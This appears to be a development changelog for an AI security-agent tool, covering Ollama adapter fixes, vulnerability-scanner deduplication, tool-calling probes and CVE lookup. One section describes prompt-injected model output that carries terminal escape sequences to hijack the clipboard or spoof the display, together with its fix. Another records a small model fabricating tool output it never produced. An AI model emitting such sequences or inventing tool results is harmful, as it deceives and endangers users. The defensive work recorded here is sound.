and correctly reported; what had decayed was the *explanation* attached to each — a plausible
mechanism recorded once when checking it was expensive, then read as fact thereafter.

#### P34.5 — nothing told an existing user their Ollama config was on the legacy compat path

A config written before P33.9 says `provider.default: openai` with
`base_url: http://localhost:11434/v1`. `providerfactory.buildOne` only wires
`ollama.WithNumCtx`/`WithKeepAlive` and the real load/token telemetry on the `ollama` branch, so
such a config silently gets none of it, forever. The cost was measured on the maintainer's own
machine: the compat path cannot send `num_ctx`, so Ollama served every request at its 4096
default while the configured model supported 40960 — a red-team session hit "context ~142% full"
on turn one, and P33.9's cold-load notice never fired because the compat path can't see
`load_duration`.

New `internal/providerfactory/legacyollama.go` (`IsLegacyOllamaCompat`, `LegacyOllamaCompatDetail`,
`LegacyOllamaCompatFix`), surfaced as a new `provider adapter` row in `aegis doctor` and a
one-line WARN at daemon startup. The message states the exact three-line config change rather
than describing it, and names the one real behavior difference so the fix isn't a silent
downgrade: the `ollama` branch defaults `think: false` while the compat path leaves the model's
own default alone, so a qwen3-style reasoning model stops thinking unless `think: true` is set.

**The item called its detection rule "trivial and unambiguous"; it wasn't.** `default: openai`
plus any `/v1` base that isn't `api.openai.com` also matches LM Studio and liteLLM — which
`buildOne`'s `openai` branch supports *on purpose*, and which have no native `/api/chat` to
switch to. Telling those users `provider.default: ollama` would break a working config.
Narrowing to `:11434` would instead miss an Ollama server proxied on another port. Resolution:
keep the detection as specified, split the *message* — a `:11434` base is stated as fact, a bare
`/v1` base is worded conditionally ("if that is an Ollama server…"). The suggested fix is
identical either way, so a false positive costs one dismissable line of advice instead of a
broken config. Both wordings are pinned by tests. Verified live beyond unit tests: `aegis doctor`
against a legacy-shaped config renders the WARN, and a real daemon logs it at startup.

#### P34.6 — brakeman reported "error" on every non-Rails project instead of skipping

`brakeman` against a non-Rails repo exits 4 with empty stdout (`Please supply the path to a Rails
application`) — brakeman working correctly. With no relevance gate, `runContainerCLI` saw a
non-zero exit with no output and the scan reported `brakeman: error: exit status 4`. A
`RelevanceChecker` on `brakemanScanner` now mirrors brakeman's own check (`config/environment.rb`
plus `config/application.rb`/`Rakefile`) and reports `no Rails application found in workspace`,
the same shape as the existing `no Dockerfile found in workspace`. `PlanScanners`'s
`!EnabledExplicit` semantics are preserved deliberately: an operator who explicitly sets
`security.tools.brakeman.enabled: true` still gets the run and brakeman's real error.

**The item under-stated its own blast radius.** It framed the trigger as the multiscanner's `full`
profile making brakeman easy to *enable* — implying operator opt-in. In fact
`AutoEnableLanguageScanners` sets `Enabled` while leaving `EnabledExplicit` false, so language
auto-detection was turning brakeman on for *any* `Gemfile`/`*.rb` project. Every non-Rails Ruby
repo hit the error; nobody had to opt in.

The item's follow-on question — do `njsscan`, `bandit` or `gosec` also error rather than skip on
the wrong language? — was answered by running them, not by assumption: all three exit 0 with
valid empty output (gosec produces no report file, which `runHostToTempSARIF` reads as zero
findings). **brakeman was the only scanner whose "not applicable" was indistinguishable from
"failed."** No gates added elsewhere. Exit 3 (brakeman on a real Rails app with findings) is safe
because `runContainerCLI` tolerates non-zero exit when output exists — which is precisely why
exit 4 broke: empty stdout.

#### P34.7 — `TestDoctorNamesPodmanMisconfig` only passed on machines without podman

The test patched `sandbox.backend: podman` and asserted doctor emits a WARN naming
`sandbox.backend`; its premise was "with no podman runtime present." The chain
`doctorSandboxCheck` → `server.SelectSandbox` → `sandbox.NewContainerBackend` reaches the real
host, so the assertion was really about the developer's toolchain — and **the greener answer was
the wrong one**: it passed precisely when it wasn't exercising the misconfig it claimed to cover.

**The item's diagnosis was wrong in a way that mattered.** It named `sandbox.DetectBest` as the
host dependency to seam, citing `internal/security`'s `detectRuntime` (`method.go:417`) as
precedent. But with `backend: podman`, config normalizes to `container`+`podman`, so
`selectRuntime` takes the **`prefer` branch and calls `probeRuntime` directly — `DetectBest` is
never reached on this path**. Seaming `DetectBest` as specified would have left the test exactly
as broken. The seam went on the selection call instead: `var selectSandbox = server.SelectSandbox`
in `internal/cli`, keeping the package-var-over-lower-package-function shape the item asked for.
The test now asserts both branches through it (runtime absent → WARN naming the key; runtime
present → PASS), scopes assertions to the sandbox row, and additionally checks `config.Normalize`
still rewrites `"podman"` → `container`/`podman` — coverage that faking at this level would
otherwise have lost.

The reproduction was itself instructive: the test *passed* on first run because podman was
installed but its machine was **stopped**. That is the bug in miniature — the assertion silently
reads host state. Starting the machine reproduced the failure as filed. Verified green with
podman both running and stopped, and confirmed load-bearing by mutating the production logic
three ways (WARN→PASS on fallback; dropping `sandbox.backend` from the Fix hint; PASS→WARN on the
active branch) and checking each mutation fails.

The item's follow-on about other doctor rows resolved on the distinction between *reads the host*
and *changes the verdict*: workspace trust, output guard and workdir allowlist are pure config;
provider and tool-calling sit behind `ollamaNativeBase`, a pure-config predicate; scanners is
neutralized by `disableAllScanners`. Only the **daemon** row genuinely probes the host, and it
cannot flip an assertion — it emits PASS/WARN and never FAIL. Left alone, with the reasoning
documented rather than a seam nothing needs. (The item named a test `TestDoctorNoFailRowsInCleanSetup`
that does not exist; the real one is `TestDoctorCleanSetupExitsZero`, which needs no seam — the
`local` default takes `SelectSandbox`'s `case "", "local"` and never probes.)

#### P34.8 — "why does trivy report 3 where grype reported 47?" — both halves of the premise were wrong

Filed as an investigation with an unbounded tail, and the cheap first step was decisive. Measured
on the host with Aegis's exact flags: **grype 55, trivy 15 (all misconfig, 0 vuln), osv-scanner 5**
on the maintainer's checkout; **grype 1, trivy 3 misconfig/0 vuln, osv-scanner 1** on a clean
worktree.

**Grype's extras are not dependency coverage.** 48 of 55 are gitignored compiled `.exe` build
artifacts (`testrun/aegis.exe`, `aegis-eval.exe`), almost all `stdlib` CVEs from the go1.25.0
toolchain baked into the binary — `syft` catalogs 574 Go components because it reads binaries,
against go.mod's 67. 2 more come from a vendored `tsc.exe` in `node_modules`. Only 5 are a real
dependency finding (`GO-2026-5320`, goldmark v1.7.13, once per nested worktree). The item's
`dist/` hypothesis was wrong — the mechanism is binary cataloging — and the conclusion runs
opposite to what the item anticipated: this is **evidence for keeping grype excluded**, not
against. Parked at the time as P34.11 — later shipped when grype was reinstated for tool
centralization, carrying the build-artifact exclusion (see P34.11 above).

**The osv-scanner=1 anomaly wasn't one.** The item's "1 across 140 npm packages" conflated two
ecosystems: the "1" was goldmark, from `go.mod`. osv-scanner *did* scan all 140 npm packages and
correctly reported **0** — the lockfile is 139 devDependencies plus preact, all clean. The detail
that "didn't sit right" was correct behavior.

**The real bug was in dedup, and it was shipping.** On a control tree where trivy and osv
genuinely overlap: **28 + 30 = 58 raw → 58 deduped, 0 merged.** Every shared CVE reported twice.
osv findings were unmergeable on *both* halves of the dedup key:

- **Location** — osv-scanner emits an absolute host path (host method) or the mount point
  (`/src`, container method); SARIF scanners emit repo-relative. `normalizeLocation` cannot
  reconcile them — it never knew the scan root. Now trimmed in `osvRelativeSource` at the one
  place that knows it (`dir` on host, `/src` in a container).
- **RuleID** — dedup keys SCA findings on an embedded CVE, but osv's group `ids` are `GO-*`/
  `GHSA-*` only; the CVE sits in the group's **`aliases`**, which the parser never read. `osvRuleID`
  now appends CVE aliases (only CVEs — `normalizeRuleID` looks for nothing else, and osv's alias
  sets carry distro IDs that would be noise in a rule ID a user reads).

`dedup.go`'s comment already described the intended shape; the parser just never produced it. The
suite stayed green because the fixtures recorded a *relative* path and a *bare-CVE* group id —
not the shape osv-scanner actually emits. Same 58 real findings now dedup to **30, with 28 merged
groups**; each half verified load-bearing (reverting either alone returns merges to zero).

Two facts worth recording from the measurement. **trivy misses `GO-2026-5320`** even as a direct
dep — its DB is fresh, the advisory's GHSA alias just hasn't landed — while its Go SCA works fine
(28 CVEs on a control tree); **osv-scanner covers exactly that gap**, so the trivy+osv pairing is
complementary, which is the reassuring answer to the item's real worry about SCA coverage. And
**trivy skips npm dev deps by default**, seeing 1 of 140 packages here; that costs nothing today
(0 vulns, osv covers them) but is filed as
[P34.10](roadmap.md#p3410--trivy-sees-1-of-140-npm-packages-because-it-skips-dev-dependencies-by-default).

---

### FIND-14 (second half) — in-process swarm teammates get a guaranteed budget share

P24.15 shipped FIND-14's fair-share floor for the **subprocess backend only**: `Spawn` computes each
worker's remaining allowance via `remainingBudget`/`remainingTokens` and carries it down in the
`WorkerSpec`. The in-process backend had no budget handling at all, so `subAgentRunner` ran every
teammate against the *shared* tracker checked at the daemon's **full configured cap**. Every sibling
therefore checked the same live aggregate, and one expensive teammate could push that total past the
cap and leave every other teammate's next per-turn check with nothing — exactly the DoS shape
(STRIDE-A, CVSS 3.6) the finding describes, still open on the backend that runs by default when the
executable path can't be resolved.

**An in-process teammate has no spec to carry its share, so it travels on the context instead.**
`InProcessBackend.Spawn` computes the same floor and attaches it via a new `WithBudgetOverride`
(`internal/swarm/types.go`); `subAgentRunner` honors it by running the teammate against a *fresh
local* tracker capped at that share, then folding the actual spend back into the shared ledger via
`AddWorkerCost`. That mirrors what `SubprocessBackend` already does with a worker's self-reported
spend, so a sibling spawned afterward still sees the updated total — the shared D1 ceiling survives,
but no teammate's live spend can starve another's floor out from under it.

No override is attached when there are no configured caps (`NewInProcessBackend` now takes
`cost.budget_usd`/`cost.max_tokens_per_run`; a caller with no cap has nothing to guarantee a share
of) or when the context carries no shared ledger to compute a share from — a detached spawn. Both
keep the existing shared-ledger behavior.

**Worth noting as a shape:** the finding was marked closed with half its surface untouched. A fix
scoped to one backend reads as done in the changelog, and the gap only surfaces by asking which
*other* code paths the same finding covers.

Tests: new `internal/swarm/inprocess_budget_test.go` — `TestInProcessSpawnAttachesBudgetOverride`,
`TestInProcessSpawnNoOverrideWithoutCaps`, `TestInProcessSpawnNoOverrideWithoutTracker`.
`go build ./...`, `go test ./internal/swarm/...` clean.

---

### FIND-17 (second half) — thinking text is sanitized before it reaches the terminal

P24.20 (FIND-17) sanitized the model's **answer** text in `mdRender`, but **thinking text never
passes through it**. Both display paths — the streaming dim tail in `refresh()` and the settled block
in `appendThinkingBlock` — render raw model reasoning through lipgloss, not glamour, so an ANSI/OSC
sequence embedded in adversarial model output (e.g. reproduced verbatim via a prompt-injection
vector) reached the terminal intact: OSC 52 clipboard writes, OSC 0/2 title-bar spoofing, cursor
repositioning, alternate-screen switches. The mitigation was real; it just didn't cover the second
channel the same untrusted text renders through.

Fix: apply the existing `stripControlSeqs` at both points. `appendThinkingBlock` is the single choke
point for settled blocks, covering `flushThinking` (live turns) and `loadHistory` (replayed history)
alike — a stored transcript replays the same untrusted bytes.

**Sanitize at render rather than at ingest**, deliberately: an escape sequence split across two
stream chunks would defeat a per-chunk pass at the `WriteString` boundary, which stays safe but
litters the leftover parameter bytes into the transcript. The assembled buffer has no such seam, and
it matches how `mdRender` already treats the answer text.

Tests: new `internal/tui/sanitize_thinking_test.go` — `TestStreamingThinkingIsSanitized`,
`TestSettledThinkingBlockIsSanitized`. `go build ./...`, `go test ./internal/tui/...` clean.

---

### P34.2 follow-up — a truncated probe is not a verdict

Found while live-verifying P34.3, in the same run: the daemon warned that `qwen3:14b` "made no tool
call on a trivial tool-calling probe — it likely can't use tools", and then that model made real
tool calls. The warning P34.2 shipped to stop a model lying to the user was itself lying about the
model. **Two independent defects stacked.**

**The probe's token cap was too tight for a reasoning model.** At `MaxTokens: 256` the model spends
its budget on thinking preamble and gets cut off before the call. Measured against the real model
rather than guessed: `qwen3:14b` needs **124-825 completion tokens** across five runs of this exact
prompt, so 256 truncated **3 of 5** — a coin flip that reported a model which calls tools reliably
as one that cannot, then cached that verdict for the daemon's entire process lifetime. The cap is a
bound, not a target (the stream ends the moment the call lands), so headroom is free for a terse
model: raised to 2048, the same reasoning `ProbeTimeout` already documents for its own generosity.

**The OpenAI adapter silently swallowed the truncation signal.** It mapped only `finish_reason:
"tool_calls"`; `"length"` fell through to the `stop := StopEndTurn` default, so a response cut off
mid-answer was indistinguishable from a model that chose to stop. The native Ollama adapter has
always mapped it (`DoneReason == "length"` → `StopMaxTokens`), so this was a gap between two
adapters that are supposed to be one seam — and it is wider than the probe: *any* caller reading
`Stop` was being told a truncated answer ended cleanly. Fixed with the same tool-call-wins
precedence the Ollama adapter uses.

With the signal available, zero tool calls **plus** truncation is now `Unknown` — never
`Unsupported` — and deliberately not cached: a verdict the run couldn't justify must not be the one
every later session in the process inherits. `aegis doctor` made the same accusation and got the
same fix.

**The two fixes are complementary, and the live run shows why both are worth having.** At the old
256 the truncation guard alone already keeps the Gate silent (truncation reaches no verdict rather
than a false one), while the raised cap is what makes a real verdict near-certain: **0/5 truncated
at 2048, 3/5 at 256**, same model, same prompt.

`internal/toolcallprobe` had **no tests at all**; it now has them, including a **`live_probe`
tier** against a real model (documented in CLAUDE.md alongside `live_eval`/`live_workflow`). That
tier is the whole point — the false positive lived through a fully green suite, because scripted
tests can only assert what the code does with a given stream, never whether the cap fits the way a
reasoning model actually thinks.

**The lesson is sharper than the bug.** P34.2's own release note says *"a cost objection stated in
the abstract survived three drafts of this roadmap; one measurement dissolved it. Measure before
deferring."* That lesson was applied to the probe's cost and not to its token budget — 256 was never
measured against a thinking model. The fix shipped the same class of defect the item was written to
warn about.

---

### P34.3 — personas preload the deferred tools they declare

Persona activation now preloads the deferred tools a persona declares, so a persona built around a
deferred tool never has to discover its own working set via `tool_search`.

The item offered two fixes; this ships **(2)**, the general one. A persona's `Tools:` frontmatter is
the author's explicit statement of its working set, so `preloadPersonaTools`
(`internal/server/engine_build.go`, next to `buildGate` — the other consumer of `p.Tools`) exposes
any tool in that list which is *currently deferred and unloaded*, onto the session's own registry
clone. Fix (1) — prose telling the model to `tool_search` first — is then unnecessary: with the
schema present, there is nothing to search for.

**The change is deliberately narrow, because `Tools:` is advisory and must stay that way (P7.5).**
Preload only ever moves a registered, currently-deferred tool from "advertised by name" to
"offered" — exactly what the model's own `tool_search` call would have done a turn later. It cannot
register a tool the registry lacks, cannot re-expose one something else deliberately un-exposed
(`SetExposed(name, false)` survives it), and changes nothing about what the permission gate allows.
The real boundary — mode, rules, contextual gates, `PersonaToolGate` — is untouched: the live A/B
below shows plan mode still blocking the preloaded `recon_scan` on execute capability, which is the
point. It runs on the **session clone**, never `s.tools`; a test pins the P9 invariant that a
red-team session can't widen the tools offered to every other session.

**A second, required half: the deferred-tools advertisement was reading the wrong registry.**
`effectiveSystem` built its `<deferred_tools>` block from the daemon-wide `s.tools` while
`tool_search` has always loaded onto the session clone (P9) — so the prompt would have kept telling
the model to `tool_search` for a schema already in front of it, re-inviting the exact round-trip
this item removes. Now sourced from `toolRegistryFor(sessionID)`, which falls back to `s.tools` only
when no session is in scope. This was a latent P9 gap in its own right: before P34.3 nothing
preloaded, but a session's *own* `tool_search` call already produced the same contradiction on the
next turn.

**Live A/B against `qwen3:14b`** — the model that produced the original observation — same prompt,
same `red-team` persona, plan mode, fix stashed vs. applied. Driven over the real daemon's HTTP/SSE
seam, not `aegis chat` (which builds its own in-process engine and would have proved nothing about
this path — the P34.2 lesson, applied rather than relearned):

- **Without the fix:** the model reasons *correctly and by name* — "I should start by calling the
  recon_scan function with the target 127.0.0.1" — then emits **zero tool calls and zero text**. The
  turn dead-ends into P34.1's empty-answer nudge, then an empty reply.
- **With the fix:** `recon_scan` is the **first** tool call, `{"targets":["127.0.0.1"]}`, correct on
  the first attempt. No `security_scan`, no `tool_search` detour. Plan mode then blocks it on
  execute capability, as designed — no scan ran.

Re-verified afterwards through the **native Ollama adapter** (the A/B above ran over the
OpenAI-compat path), where the same session is clean end to end: `recon_scan` first, correct target,
and zero notices — no probe false positive, no context overflow, no empty answer.

**This revised the item's own diagnosis.** P34.3 was filed as an inefficiency ("tried `security_scan`
twice before being told to call `tool_search`"); the recorded baseline is worse than that. A persona
that promises a tool the schema list doesn't carry doesn't just misroute the model — it can strand
it in a turn that produces nothing at all. The filed observation was one sample of the failure, not
its bound.

**Cost, measured rather than asserted** (the P34.2 "measure before deferring" lesson): 18 of 22
built-in personas declare at least one deferred tool, red-team the most at six
(`render_diagram`, `latex_build`, `latex_new_document`, `dast_scan`, `recon_scan`,
`security_advise`) ≈ 8.9KB of description+schema, ~2.2k tokens; most personas sit at two or three,
≈700-2000 bytes. That is a real re-inflation of exactly what deferral (P4.6) exists to avoid, and it
is still the right trade: it buys back a turn the model otherwise spends on a `tool_search`
round-trip — or, as the baseline shows, wastes entirely — for tools the persona was built to use.
Preload stays scoped to the declared list; a deferred tool a persona never names stays deferred.

---

**Previously:** shipped **P34.2, both levers**: warn when the selected model can't
actually make tool calls. Lever (2) names it after the fact at zero cost; lever (1) probes the model
and warns *before* the turn is spent.

The item's observation was reproduced live before anything was written (`qwen2.5-coder:1.5b` pulled
for exactly this, `aegis chat --mode plan` through the P33.9 native adapter): the model made **zero**
tool calls, printed a tool-call-shaped JSON object into its prose, then fabricated a directory
listing — inventing `.go` files named after Aegis's own tools (`tool_search.go`, `web_fetch.go`,
`write_file.go`). Nothing in the run said why.

`engine.Run`'s `len(toolUses) == 0` branch now emits a one-per-run `KindNotice` ("model emitted a
tool call as text — it may not support tool calling; run `aegis doctor` to check this model") when
the final text contains tool-call-shaped JSON naming a tool the model was actually offered. Warn
only, never blocking — a prose-only session with such a model is still legitimate. The detector
(`looksLikeToolCallJSON`) decodes candidate `{`-anchored substrings rather than brace-matching (the
decoder stops at the first complete value and handles string escaping for free), gated behind a
cheap `"arguments"`/`"parameters"` substring pre-check and a 64-candidate cap so a code-heavy answer
can't make it quadratic.

**Two deviations from the item as written, both deliberate.** (a) The item says fire when *the turn*
made zero structured tool calls; this keys on `toolRoundsCompleted == 0` — the whole *run* — because
a model that already made a real tool call has proven it speaks the protocol, so JSON in its final
answer is quotation, not incapacity. (b) The name must match a tool actually in `Schemas()`; any
name/arguments pair would fire on ordinary JSON in an answer. Both narrow the check toward silence,
consistent with the P33 lesson that a notice which fires on prose the user can see is not a tool
call would be worse than none.

**Two real bugs found by live-verifying rather than trusting the tests** — both in
`internal/cli/chat.go`, both pre-existing, both invisible to the unit tests and to the TUI:
**(1)** `emitStreamEvent` never copied `Text` for `KindNotice`, so every engine advisory (this one,
P34.1's empty-answer notice, P33.9's cold-load notice, context-fill, compaction) reached
`--output-format stream-json` as a content-free `{"type":"notice"}`. The first live run surfaced
exactly that, which is how it was caught. **(2)** `toolCalls++` sat inside the `outputJSON` branch of
the event switch, so the stream-json trailer reported `"tool_calls":0` unconditionally — wrong in
precisely the surface this item exists to make legible. Both fixed; `TestEmitStreamEvent` extended to
cover the notice payload.

Live-verified end to end on both sides after the fix. `qwen2.5-coder:1.5b`: the P28.3 zero-tool nudge
fires first, fails to help, then the new notice names the actual cause. `supergoatscriptguy/
mythos-sec:24b` (capable, same prompt, 2 runs): real `ls`/`read_file` tool calls, no false positive,
and `tool_calls: 2` now correctly reported. One run also surfaced P33.9's cold-load notice
("model cold-loaded (28.2s)") — incidental confirmation that path works live. New tests:
`TestToolCallAsTextNotice`, `TestToolCallAsTextNoticeSkippedAfterRealToolCall`,
`TestLooksLikeToolCallJSON` (`internal/engine/toolcallastext_test.go`).

### Lever (1) — probe the model, warn before the turn is spent

**The item deferred this on "probe cost", and that cost turned out not to exist.** The probe only ever
runs against local Ollama-style providers (the same `isOllamaProvider` gate `aegis doctor` and the
P28.7 reachability check use), so it never touches a paid API. And run at *run start*, it shares the
cold load the turn was about to pay anyway — Ollama keeps the model resident, so the probe's real
marginal cost is its own inference on an already-loading model, not the ~28s load. The abstract
objection had survived three roadmap drafts; one measurement dissolved it.

`internal/toolcallprobe` is a new package holding the single definition of the smoke test (prompt,
system prompt, tool schema, `Run`). `doctorToolCallCheck` was refactored onto it — its five existing
tests pass unchanged against the shared code — so the daemon's gate and doctor's diagnostic row can't
drift into two different verdicts for the same model. `toolcallprobe.Gate` adds the caching layer:
one verdict per model, `singleflight`-collapsed so concurrent sessions starting on a cold model share
one probe rather than queueing a load each.

**Three rules the implementation holds that the item didn't state.** (a) *An inconclusive probe never
blames the model* — a transport error, a mid-stream provider error, or a timeout yields `Unknown`, is
never cached, and says nothing; telling a user their model can't call tools when the truth is the
server was down would be worse than silence. (b) *The verdict cache is never persisted*, though "once
per model, not per daemon" is tempting: an Ollama tag is mutable, so `ollama pull` can replace what
`qwen3:14b` means without the name changing, and a verdict on disk could outlive the model it
describes. (c) *Warn once per session per model, not per run* — see the live findings below.

**Placement deviates from the item deliberately.** It names three model-selection sites (daemon start,
`PATCH /sessions/{id}`, the TUI `/models` picker); this hooks run start instead, which is the one
choke point downstream of all three and the only place the model is known *after* the persona pin, the
per-session `/model` override, and P30's routing have resolved. It is also the only one where the
probe is free, since it's the moment the model gets loaded regardless.

**Four things only live runs caught, each after the code was already green:**
**(1)** Lever (1) was fully wired, built, and unit-green — and did nothing when tested through
`aegis chat`, because `chat` builds its own in-process engine and never touches the daemon's run
path. No test asserted otherwise. This is left as-is by decision, and documented: lever (1)'s cache
can only amortize in a long-lived process, so probing in a one-shot CLI would double the model calls
of every scripted `aegis chat` and never repay it — and lever (2) already covers that surface at zero
cost, verified live. **(2)** Verified against a real daemon over the HTTP+SSE seam (the
`TestLiveWorkflow` approach, since `chat` was the wrong surface): the warning fires before the run on
`qwen2.5-coder:1.5b`, naming the model. **(3)** A second run on the same daemon warned from cache in
0.9s with no re-probe. **(4)** That same run exposed the nagging problem — `what is 2+2?` drew the
full paragraph, and in a TUI it would have repeated on every message of the session. Hence rule (c):
a tool-incapable model is still perfectly good company for conversation. Re-warning on a model switch
is kept, since that's new information.

Also fixed here, found while writing the concurrency test: `Gate.Verdict`'s cache fast-path sat
outside the singleflight, so a caller could miss the cache, wait for the slot, and probe a second time
after another goroutine had already stored the verdict — a duplicated model load, the exact cost the
cache exists to prevent. Now re-checked inside the flight.

New tests (`internal/server/toolcalling_test.go`): `TestToolCallingWarningFlagsModelWithNoToolCalls`,
`TestToolCallingWarningSilentForCapableModel`, `TestToolCallingWarningNeverBlamesAnOutage`,
`TestToolCallingWarningProbesOncePerModel`, `TestToolCallingWarningWarnsOncePerSession`,
`TestToolCallingWarningCollapsesConcurrentProbes`, `TestToolCallingWarningSkipsNonLocalProvider`,
`TestToolCallingWarningSkipsUnresolvedModel` — green under `-race -count=5`.
`docs/providers.md`'s "Tool-calling reliability for local models" section documents both warnings and
adds `qwen2.5-coder:1.5b` to the model table, calling out its distinct failure shape: unlike
`deepseek-r1:8b`, which simply answers in prose, it *fabricated* the output of the tool it never
called.

---

**Last updated:** 2026-07-16 — shipped **P34.4**: CPE-based product+version matching for
`security_advise`'s `cve_lookup` action. Found the same day via a manual `red-team`-persona
workflow test (`recon_scan` against a home-lab host, then `cve_lookup` on what it found):
`cve_lookup` only supported a CVE ID or NVD's free-text `keywordSearch`, which matches on CVE
prose rather than the affected-product field — a nuclei finding titled "SMB Anonymous Access
Detection" returned CVE-2016-9463 (a Nextcloud/ownCloud auth-bypass CVE) and CVE-2024-5262 (a
ProjectDiscovery Interactsh SMB issue), neither plausibly related to the actual scanned host.

Added `CVEOptions.Product`/`Version` (`internal/security/cve.go`), folded into NVD's
`virtualMatchString` query parameter as `cpe:2.3:*:*:<product>:<version>:*:*:*:*:*:*:*` —
vendor and every other CPE 2.3 component wildcarded, since the common caller (an nmap
service/version banner) doesn't know the vendor field. `LookupCVE` now validates exactly one of
cve_id/keyword/product+version is set. `security_advise`'s `cve_lookup` action
(`internal/tool/builtin/advise.go`) exposes `product`/`version` as sibling input fields to
`keyword`, with its description telling the model to prefer CPE matching whenever a scanner
captured a versioned banner and fall back to keyword search only when it didn't. Live-verified
against the real NVD API: `product="openssh" version="7.4"` returned only
OpenSSH-specific CVEs (CVE-2017-15906, CVE-2018-15473, CVE-2018-15919, CVE-2018-20685,
CVE-2019-6109), all pre-7.6 as expected — no off-target matches, unlike the keyword-search
baseline. New tests: `TestLookupCVEProductVersionSearch`,
`TestLookupCVERequiresBothProductAndVersion`,
`TestLookupCVERejectsProductVersionAlongsideKeyword` (`internal/security/cve_test.go`);
existing `TestAdviseToolCVELookupWiring` and the rest of the `cve_test.go`/`advise_test.go`
suites still pass unchanged. Keyword search stays as the fallback path (some findings, e.g.
misconfig-class nuclei templates, have no version to match against) — this was additive, not a
replacement.

**P34.1 shipped 2026-07-16** — detect and recover a run that ends with no
user-visible text. Observed live in the 2026-07-16 3-model eval pass (`gpt-oss:20b`, 1 run in 4):
tool calls executed, the run ended without error, and the final turn carried **zero** visible text —
`aegis chat --output-format json` returned an empty `answer`, and the TUI showed tool activity
followed by nothing.

The roadmap flagged its mechanism as **unverified**, so per the P33 batch's own lesson it was
re-derived with a failing test before any fix was written — and this time the written diagnosis
held. Confirmed: `engine.Run`'s `len(toolUses) == 0` branch emits `KindDone` on `StopEndTurn`
without ever checking whether text was produced, and the output guard is no backstop because it is
itself gated on `if final := assistantText(assistant); final != ""` — an empty answer skips
validation rather than failing it. That is the whole bug: silence is the one output nothing in the
pipeline inspects.

The fix, in that same branch and deliberately model-agnostic (the cause is gpt-oss routing its
conclusion to the thinking channel, but the recovery doesn't depend on that): when a turn ends with
`assistantText(assistant) == ""`, append one user-role nudge asking for the final answer as plain
text and loop. It is bounded to a **single** attempt per run via `emptyAnswerNudges` — an unbounded
version would trade an empty reply for a model that never speaks spinning to the iteration cap,
which is a strictly worse failure. If the nudge also comes back empty, a `KindNotice` names the
condition so the empty reply is explained rather than silent. Placement is after the P28.3 zero-tool
nudge, which keeps precedence on its own (disjoint) failure mode: P28.3 fires only when
`toolRoundsCompleted == 0` and the request `looksActionable`, whereas P34.1's live case is a
*successful* tool round followed by silence. Scaffolding is retracted from the durable transcript on
settle, reusing P28.3's established pattern — `retractZeroToolNudges`/`isZeroToolNudge` were
generalized into `retractNudges(conv, prefix)`/`isNudge(m, prefix)` (single existing caller) rather
than duplicated per nudge type.

The eval harness gained `KindNotice` capture to support the required scenario: `TurnResult.Notices`,
`Result.AllNotices()`, and an `ExpectNoticeCountContaining(substr, want)` check — a *count*, not a
presence check, because for bounded self-correcting behavior a nudge firing twice is as much a
regression as one never firing. `goldenTranscript` is a separate projection from `Result`, so the
new field left `tool_round_trip.golden.json` untouched (exactly the decoupling that type's comment
was written to provide). New tests: `internal/eval`'s `TestScenario_EmptyAnswerNudgedExactlyOnce`
plus three engine tests covering recovery, the bounded-once-then-notify stubborn case, and the
no-false-positive path when text is present. All three failed against unmodified code first.
`go build ./...` / `go vet ./...` / `go test ./...` / `go test -race` green.

Verified live against a real Ollama server (`qwen3:14b`), since the change's main risk is a *false
positive* nudging healthy runs: a plain prompt returned `turns: 1` and a real answer, and a
tool-using prompt returned `turns: 2` / `tool_calls: 1` and a correct answer — a spurious nudge
would have shown one extra turn in either. The originating model (`gpt-oss:20b`) is not currently
pulled locally, so the text-less path itself is covered by the deterministic tiers rather than
re-observed live.

---

**Last updated:** 2026-07-16 — shipped **P33.9**, the Tier 3 keystone: a native Ollama
`provider.Adapter` (`internal/provider/ollama`) speaking `/api/chat` directly instead of Ollama's
OpenAI-compatible `/v1/chat/completions` endpoint, unlocking the four things that endpoint
structurally blocked. **(1)** Per-request `options.num_ctx`: `providerfactory.buildOne`'s `"ollama"`
case now passes `cfg.Provider.ContextWindow` straight through via `ollama.WithNumCtx`, and
`internal/server/contextwindow.go`'s `initContextWindow` short-circuits to `ctxWinFinal = true`
immediately when both a configured window and the native adapter are in play — the served window is
now exactly what's configured, no `/api/ps`/`/api/show` probe needed (that probe path is unchanged
for the `provider: openai` + Ollama-base_url shape, which still can't set num_ctx). **(2)**
`keep_alive`: exposed as `ollama.WithKeepAlive`, not yet driven by config — that's P33.10. **(3)**
Real token usage: `prompt_eval_count`/`eval_count` land directly in `provider.Usage`, so
`engine.go`'s byte-count estimate fallback (`IsEstimated`) never triggers for this adapter — real
counts flow automatically since it only estimates when both fields are zero. **(4)** Load telemetry:
a new `Usage.LoadDurationMS` field (nanosecond `load_duration` converted to ms) surfaces as a dim
`KindNotice` ("model cold-loaded (8.2s)") from `engine.go`'s `turn()` whenever it's ≥1s — below that
threshold is just an already-warm model's own bookkeeping overhead. Other adapter-shape notes: tool
calls arrive as complete objects on Ollama's native stream (no incremental-argument accumulation
like the OpenAI-compat path), so `EventToolUseStart` and the fully-assembled `EventToolUse` fire
back to back per call; call IDs are synthesized (`tu_N`, native tool calls carry none) and tool
*results* are correlated back to the model by name (`tool_name` field) rather than an ID, since
native has no `tool_call_id` — `translate()` builds an ID→name map from the conversation's own
`ToolUseBlock`s to bridge that. Mid-stream errors use the bare-string `{"error":"..."}` spelling
(the object spelling is tolerated defensively). The `openai` adapter/provider value is completely
unchanged — the documented `provider: openai` + `base_url: http://localhost:11434/v1` pattern
(`internal/cli/init.go`'s template) keeps working exactly as before; only the `provider: ollama`
value's construction switched adapters. New package tests
(`internal/provider/ollama/ollama_test.go`): message/tool-result/image translation, full stream
parsing (text, tool call, usage, load duration), mid-stream error, `/v1`-suffix stripping, and
`options` field population. `internal/cli/doctor_test.go`'s live-smoke-test mocks were updated from
OpenAI-compat SSE framing to native NDJSON to match (they exercise `provider: ollama` through the
real `providerfactory.Build`). New engine tests
(`TestRunEmitsColdLoadNotice`/`TestRunSkipsColdLoadNoticeBelowThreshold`) and a context-window test
(`TestInitContextWindowNativeOllamaWithConfigSkipsProbe`, using an unreachable `base_url` to prove no
network probe fires). Unblocks P33.10 (keep-alive pre-warm) and P33.19 (naming the post-tool-round
wait via `prompt_eval_count`/`load_duration`); P33.16 can now decide its retry-classification
question against a real error taxonomy. `go build ./...` / `go vet ./...` / `go test ./...` green.

`live_workflow` eval tier since run against a real local Ollama server (0.30.10), both `gpt-oss:20b`
(this repo's own configured default) and `qwen3:14b`: 10 total daemon runs across both models,
every one reporting real (`estimated=false`) token usage end to end, with `glob`/`read_file`/
`edit_file`/`shell`/`grep`/`ls` all translating and executing correctly through the new adapter.
